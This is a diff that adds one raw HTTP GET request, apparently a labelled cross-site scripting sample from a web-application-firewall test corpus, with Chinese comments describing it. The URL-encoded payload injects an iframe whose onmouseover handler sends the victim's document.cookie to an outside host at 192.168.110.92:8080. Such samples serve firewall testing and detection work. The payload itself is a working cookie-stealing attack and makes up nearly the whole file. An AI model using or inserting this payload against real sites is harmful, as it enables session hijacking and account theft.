@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件-06506842
+# 通过在一个iframe元素中嵌入JavaScript代码，向恶意地址发送cookie信息。基于IFRAME事件，IFrame和大多数其他元素可以使用基于事件的混乱，当鼠标悬停时触发。
+GET /?id=%3CIFRAME%20SRC=%23%20onmouseover=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3E%3C%2FIFRAME%3E&bid=hd_tag_m8mv24yo HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24yo
+RM-PRO-Token: d3fc5f87d297ee5cf1c0ad3b885f3052
+RM-PRO-Time: 1742808424292
+User-Agent: curl/7.83.1
+
